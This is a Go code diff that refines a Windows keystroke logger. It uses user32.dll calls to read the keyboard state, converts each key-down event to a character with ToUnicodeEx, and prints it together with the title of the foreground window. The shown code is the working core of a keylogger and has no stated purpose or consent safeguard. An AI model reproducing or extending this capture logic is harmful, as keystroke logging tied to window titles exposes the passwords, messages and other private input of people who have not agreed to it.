@@ -13,11 +13,15 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-var previous_modkey types.VKCode = types.VK_NONAME
+// var previous_modkey types.VKCode = types.VK_NONAME
 
 var (
 	mod = windows.NewLazyDLL("user32.dll")
 
+	procGetKeyState         = mod.NewProc("GetKeyState")
+	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
+	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
+	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
 	procGetWindowText       = mod.NewProc("GetWindowTextW")
 	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
 )
@@ -75,173 +79,33 @@ func Run() error {
 		case k := <-keyboardChan:
 			if hwnd := GetForegroundWindow(); hwnd != 0 {
 				text := GetWindowText(HWND(hwnd))
-				fmt.Println("window:", text)
-				fmt.Printf("Received %v %v %v\n", k.Message, k.VKCode, k.ScanCode)
-				fmt.Println(VKCodeToAscii(k))
+				// fmt.Printf("Received %v %v %v\n", k.Message, k.VKCode, k.ScanCode)
+				if k.Message == types.WM_KEYDOWN {
+					fmt.Println("window:", text)
+					fmt.Println(string(VKCodeToAscii(k)))
+				}
 			}
-			continue
 		}
 	}
 }
 
-func VKCodeToAscii(k types.KeyboardEvent) string {
+func VKCodeToAscii(k types.KeyboardEvent) rune {
+	var buffer []uint16 = make([]uint16, 256)
+	var keyState []byte = make([]byte, 256)
 
-	// if k.Message == types.WM_KEYDOWN && k.VKCode == types.VK_LSHIFT {
-	// 	previous_modkey = types.VK_LSHIFT
-	// } else if k.Message == types.WM_KEYUP && k.VKCode == types.VK_LSHIFT {
-	// 	previous_modkey = types.VK_NONAME
-	// }
+	n := 10
+	n |= (1 << 2)
 
-	// if k.VKCode == types.VK_A && previous_modkey != types.VK_NONAME {
-	// 	return "A"
-	// }
-	// if k.VKCode == types.VK_B && previous_modkey != types.VK_NONAME {
-	// 	return "B"
-	// }
-	// if k.VKCode == types.VK_C && previous_modkey != types.VK_NONAME {
-	// 	return "C"
-	// }
-	// if k.VKCode == types.VK_D && previous_modkey != types.VK_NONAME {
-	// 	return "D"
-	// }
-	// if k.VKCode == types.VK_E && previous_modkey != types.VK_NONAME {
-	// 	return "E"
-	// }
-	// if k.VKCode == types.VK_F && previous_modkey != types.VK_NONAME {
-	// 	return "F"
-	// }
-	// if k.VKCode == types.VK_H && previous_modkey != types.VK_NONAME {
-	// 	return "H"
-	// }
-	// if k.VKCode == types.VK_I && previous_modkey != types.VK_NONAME {
-	// 	return "I"
-	// }
-	// if k.VKCode == types.VK_J && previous_modkey != types.VK_NONAME {
-	// 	return "J"
-	// }
-	// if k.VKCode == types.VK_K && previous_modkey != types.VK_NONAME {
-	// 	return "K"
-	// }
-	// if k.VKCode == types.VK_L && previous_modkey != types.VK_NONAME {
-	// 	return "L"
-	// }
-	// if k.VKCode == types.VK_M && previous_modkey != types.VK_NONAME {
-	// 	return "M"
-	// }
-	// if k.VKCode == types.VK_N && previous_modkey != types.VK_NONAME {
-	// 	return "N"
-	// }
-	// if k.VKCode == types.VK_O && previous_modkey != types.VK_NONAME {
-	// 	return "O"
-	// }
-	// if k.VKCode == types.VK_P && previous_modkey != types.VK_NONAME {
-	// 	return "P"
-	// }
-	// if k.VKCode == types.VK_Q && previous_modkey != types.VK_NONAME {
-	// 	return "Q"
-	// }
-	// if k.VKCode == types.VK_R && previous_modkey != types.VK_NONAME {
-	// 	return "R"
-	// }
-	// if k.VKCode == types.VK_S && previous_modkey != types.VK_NONAME {
-	// 	return "S"
-	// }
-	// if k.VKCode == types.VK_T && previous_modkey != types.VK_NONAME {
-	// 	return "T"
-	// }
-	// if k.VKCode == types.VK_U && previous_modkey != types.VK_NONAME {
-	// 	return "U"
-	// }
-	// if k.VKCode == types.VK_V && previous_modkey != types.VK_NONAME {
-	// 	return "V"
-	// }
-	// if k.VKCode == types.VK_W && previous_modkey != types.VK_NONAME {
-	// 	return "W"
-	// }
-	// if k.VKCode == types.VK_X && previous_modkey != types.VK_NONAME {
-	// 	return "X"
-	// }
-	// if k.VKCode == types.VK_Y && previous_modkey != types.VK_NONAME {
-	// 	return "Y"
-	// }
-	// if k.VKCode == types.VK_Z && previous_modkey != types.VK_NONAME {
-	// 	return "Z"
-	// }
+	procGetKeyState.Call(uintptr(k.VKCode))
 
-	// if k.VKCode == types.VK_A && previous_modkey == types.VK_NONAME {
-	// 	return "a"
-	// }
-	// if k.VKCode == types.VK_B && previous_modkey == types.VK_NONAME {
-	// 	return "b"
-	// }
-	// if k.VKCode == types.VK_C && previous_modkey == types.VK_NONAME {
-	// 	return "c"
-	// }
-	// if k.VKCode == types.VK_D && previous_modkey == types.VK_NONAME {
-	// 	return "d"
-	// }
-	// if k.VKCode == types.VK_E && previous_modkey == types.VK_NONAME {
-	// 	return "e"
-	// }
-	// if k.VKCode == types.VK_F && previous_modkey == types.VK_NONAME {
-	// 	return "f"
-	// }
-	// if k.VKCode == types.VK_H && previous_modkey == types.VK_NONAME {
-	// 	return "h"
-	// }
-	// if k.VKCode == types.VK_I && previous_modkey == types.VK_NONAME {
-	// 	return "i"
-	// }
-	// if k.VKCode == types.VK_J && previous_modkey == types.VK_NONAME {
-	// 	return "j"
-	// }
-	// if k.VKCode == types.VK_K && previous_modkey == types.VK_NONAME {
-	// 	return "k"
-	// }
-	// if k.VKCode == types.VK_L && previous_modkey == types.VK_NONAME {
-	// 	return "l"
-	// }
-	// if k.VKCode == types.VK_M && previous_modkey == types.VK_NONAME {
-	// 	return "m"
-	// }
-	// if k.VKCode == types.VK_N && previous_modkey == types.VK_NONAME {
-	// 	return "n"
-	// }
-	// if k.VKCode == types.VK_O && previous_modkey == types.VK_NONAME {
-	// 	return "o"
-	// }
-	// if k.VKCode == types.VK_P && previous_modkey == types.VK_NONAME {
-	// 	return "p"
-	// }
-	// if k.VKCode == types.VK_Q && previous_modkey == types.VK_NONAME {
-	// 	return "q"
-	// }
-	// if k.VKCode == types.VK_R && previous_modkey == types.VK_NONAME {
-	// 	return "r"
-	// }
-	// if k.VKCode == types.VK_S && previous_modkey == types.VK_NONAME {
-	// 	return "s"
-	// }
-	// if k.VKCode == types.VK_T && previous_modkey == types.VK_NONAME {
-	// 	return "t"
-	// }
-	// if k.VKCode == types.VK_U && previous_modkey == types.VK_NONAME {
-	// 	return "u"
-	// }
-	// if k.VKCode == types.VK_V && previous_modkey == types.VK_NONAME {
-	// 	return "v"
-	// }
-	// if k.VKCode == types.VK_W && previous_modkey == types.VK_NONAME {
-	// 	return "w"
-	// }
-	// if k.VKCode == types.VK_X && previous_modkey == types.VK_NONAME {
-	// 	return "x"
-	// }
-	// if k.VKCode == types.VK_Y && previous_modkey == types.VK_NONAME {
-	// 	return "y"
-	// }
-	// if k.VKCode == types.VK_Z && previous_modkey == types.VK_NONAME {
-	// 	return "z"
-	// }
-	return ""
+	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
+	r1, _, _ := procGetKeyboardLayout.Call(0)
+
+	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
+		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)
+
+	if len(syscall.UTF16ToString(buffer)) > 0 {
+		return []rune(syscall.UTF16ToString(buffer))[0]
+	}
+	return rune(0)
 }
